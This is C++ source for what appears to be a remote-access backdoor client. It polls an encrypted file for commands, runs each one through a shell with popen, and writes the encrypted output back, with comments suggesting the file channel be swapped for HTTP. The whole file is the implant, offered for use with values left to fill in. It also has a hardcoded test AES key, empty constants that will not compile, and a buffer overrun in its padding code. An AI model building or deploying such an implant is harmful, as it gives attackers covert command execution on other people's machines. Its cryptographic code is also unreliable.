#define _CRT_RAND_S

#include <cstdio>
#include <memory>
#include <string>
#include <array>
#include <iostream>
#include <stdio.h>
#include <string>
#include <unistd.h>
#include <fstream>
#include <sstream>
#include <chrono>

#include "AES.h"





using namespace std;



// pls dont bully
using namespace std;

// EDIT THESE VALUES
const string POST_FILE  = ; // Path for SERVER - CLIENT communication
const string GET_FILE = ;  // Path for CLIENT - SERVER communication
const string GET_CACHE =  ;// Path for cache

// AES key
unsigned char key[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
    0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f };
//



const uint16_t MAX_TIMEOUT = 8;
const unsigned int BLOCK_BYTES_LENGTH = 16 * sizeof(unsigned char);
unsigned int rng = 0;
unsigned int prevTime;



string CWD()
{
    char tmp[256];
    getcwd(tmp, 256);
    return string(tmp);

}


// ExecutesCommand and returns the result
std::string ExecuteCommand(const char* cmd) {
    string ccd = string(cmd);
    if (ccd.substr(0,2) == "cd" && ccd.length() > 3) {
        if (ccd.substr(2,2) == "..")
        {
            chdir("..");
            return CWD();
        }


        chdir(ccd.substr(3,ccd.length()+3).c_str());
        return CWD();

    }


    char buffer[256];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");

    if (!pipe) return "EXECUTION FAILED!";
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        return "EXECUTION FAILED!";
    }
    pclose(pipe);
    if(result == "")
    {
        result = "Invalid Command";
    }
    cout << "RESULT :: " << result << endl;
    return result;

}


// Write to file
void Write(string path, string* data)
{
  // Create and open a text file
  ofstream MyFile(path);

  // Write to the file
  MyFile << *data;

  // Close the file
  MyFile.close();
}
// Read file
string Read(string path)
{
    string totalData;
    string data;

    // Open file
    ifstream ReadFile(path);

    // For each line
    // Not necessary because the client only writes one line
    // but I'm too lazy to edit it
    while (getline (ReadFile, data)) {
        totalData += data;
    }

    // Close file
    ReadFile.close();

    return totalData;

}





// Randomises rng
void Random()
{
    // According to the documentation "rand_s"
    // is relatively cryptographically secure
    // secure enough for IV

    // When I just called the function it didn't work
    // it returned hex or memory addresses
    rand_s(&rng);
}
// Generate 16 random bytes
void GenerateIV(unsigned char iv[16])
{
    for (int i=0;i<16;i++)
    {
        Random();
        iv[i] = rng % 256;
    }
}

// Takes a string and encrypts it (also handles padding).
// First 32 CHARACTERS are IV
string Encrypt(string plainText)
{

    // String to constant char arary
    const unsigned char* cData = (unsigned char*) plainText.c_str();

    // Gather some information about the plainText
    unsigned int blockCount = (plainText.length()/16) + 1;
    unsigned int mod = plainText.length() % 16;

    // Create new non constant array with cData, this is what gets encrypted
    unsigned char data[plainText.length()];
    for(int i=0;i<plainText.length();i++)
    {
        data[i] = cData[i];
    }

    // Add basic padding using the modulo
    for(int i=plainText.length();i<plainText.length()+mod;i++)
    {
        data[i] = 0x00;
    }


    // Generate IV (initialisation vectors) for AES
    unsigned char iv[16];
    GenerateIV(iv);

    // Length of cipherText
    unsigned int len;

    // Initialise AES class
    AES aes(256);

    // Encrypt
    unsigned char* out = aes.EncryptCBC(data, BLOCK_BYTES_LENGTH*blockCount, key, iv, len);



    string cipherText = "";
    char hex[4];

    // First hexify the IV (16 bytes so 32 characters) and add to cipherText
    for (int i=0;i<16;i++)
    {
        sprintf(hex, "%X", int(iv[i]));
        if (strlen(hex) == 1) cipherText += "0";
        cipherText += hex;
    }

    // Finally hexify and add the actual cipherText to the output
    for (int i=0;i<len;i++)
    {

        sprintf(hex, "%X", int(out[i]));
        if (strlen(hex) == 1) cipherText += "0";
        cipherText += hex;
    }


    delete[] out;

    return cipherText;
}

// Takes in string (min length 64, 32 characters of IV, rest is cipherText)
// and decrypts it
string Decrypt(string cipherText)
{

    // First get IV, 16 bytes so the first 32 (hex) characters
    unsigned char iv[16];
    for(int i=0; i<32; i+=2)
    {
        // Get 2 characters
        string sub = cipherText.substr(i,2);

        // and convert them from hex string to byte (char)
        iv[i/2] = (unsigned char) stoi(sub, nullptr, 16);
    }

    // Then get the actual cipherText (from 32 to length)
    unsigned char data[(cipherText.length()-32)/2];

    for(int i=32; i<cipherText.length(); i+=2)
    {
        // Get 2 characters
        string sub = cipherText.substr(i,2);

        // and convert them from hex string to byte (char)
        data[(i-32)/2] = (unsigned char) stoi(sub, nullptr, 16);
    }

    // Get block count
    unsigned int blockCount = ((cipherText.length()-32)/2/16) + 1;

    // Initialise AES class
    AES aes(256);

    // Decrypt
    unsigned char* out = aes.DecryptCBC(data, BLOCK_BYTES_LENGTH*blockCount, key, iv);


    string plainText;

    // Get the plainText until the first null (padding)
    for(int i =0;i<16*blockCount;i++)
    {

        if (out[i] == 0) break;

        plainText += out[i];
    }

    delete[] out;
    return plainText;
}

// "Get" function, can be edited for a http GET
string Get()
{
    string plainText;
    try
    {
        string data = Read(GET_FILE);
        plainText = Decrypt(data);
    }
    catch(...)
    {
        plainText = to_string(prevTime) + "|GET Error";
        cout << "GET ERROR" << endl;
    }


    return plainText;
}



// "Post" function, can be edited for a http POST
void Post(string data)
{

    try
    {
        string cipherText = Encrypt(data);
        Write(POST_FILE, &cipherText);
    }
    catch(...)
    {
        cout << "POST Error" << endl;
    }

}


// Get time since epoch in seconds
string CurrentTime()
{
    const auto p1 = std::chrono::system_clock::now();

    auto time = std::chrono::duration_cast<std::chrono::seconds>(
                   p1.time_since_epoch()).count();
    return to_string(time);
}


// Removes newline at the end of a string
void RemoveNewline(string* str)
{
    if (!(*str).empty() && (*str)[(*str).length()-1] == '\n') {
        (*str).erase((*str).length()-1);
    }

}






int main()
{

    // Time between messages, doubles each time no message is received
    uint16_t timeout = 1;

    // Time appended to previous message is read from cache
    try
    {
        prevTime = stoi(Read(GET_CACHE));

    }
    catch(...)
    {
        prevTime = 0;
    }

    // string and int form of the time appended to the current message
    string strCurrentTime;
    unsigned int currentTime;

    // Message is total message sent (TIME|COMMAND)
    string message;

    string command;

    string result;

    while (true)
    {
        // Sleep and double sleep delay every time up to MAX_TIMEOUT
        sleep(timeout);
        if (timeout < MAX_TIMEOUT) timeout = timeout << 1;

        cout << "CHECK FOR NEW COMMAND. TIMEOUT: " << timeout << endl;

        // Get current message and divide it into currentTime & command
        message = Get();
        stringstream streamMessage(message);

        // Get currentTime from message
        getline(streamMessage, strCurrentTime, '|');
        currentTime = stoi(strCurrentTime);

        // Get command from message
        command = message.substr(strCurrentTime.length()+1, message.length()-strCurrentTime.length());
        RemoveNewline(&command);

        // If new message (time) is received
        if (currentTime > prevTime)
        {
            // Set
            timeout = 1;
            prevTime = currentTime;

            // Write currentTime to cache
            Write(GET_CACHE, &strCurrentTime);

            cout << command << endl;


            // Execute and return
            result = ExecuteCommand(command.c_str());

            Post(CurrentTime() + "|" + result);

        }



            //
           // cout << out << endl;
            //Post(out);



    }




    return 0;


}



